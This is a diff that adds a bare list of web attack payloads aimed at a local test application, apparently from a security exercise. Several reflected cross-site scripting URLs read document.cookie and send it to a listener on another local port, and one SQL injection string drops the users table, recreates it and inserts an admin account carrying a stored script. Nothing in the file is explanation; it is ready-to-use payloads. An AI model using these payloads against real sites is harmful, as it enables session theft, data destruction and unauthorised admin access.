@@ -1,0 +1,16 @@
+http://127.0.0.1:8000/users/Provender?<script>document.cookie</script>
+http://localhost:8080/users/Provender?<script>document.cookie</script>
+
+http://localhost:8080/users/Provender?<script>alert(document.cookie);var i=new Image;i.src="http://localhost:8080/?"+document.cookie;</script>
+
+http://localhost:8080/users/Provender?<script>var i=new Image;i.src="http://localhost:8081/?"+document.cookie;</script>
+
+
+http://localhost:8080/users/Provender?<img src=x onerror="this.src='http://localhost:8082/?'+document.cookie; this.removeAttribute('onerror');">
+
+http://localhost:8080/users/Provender?<img src=x onerror=this.src='http://localhost:8082/?'+document.cookie>
+
+
+
+' or 1 = 1; DROP TABLE users; CREATE TABLE users(username varchar(250), password varchar(250), message varchar(250), isadmin int); INSERT INTO users values("Provender",'<head><script>alert(document.cookie)<script></head>','a', 1); SELECT '"
+
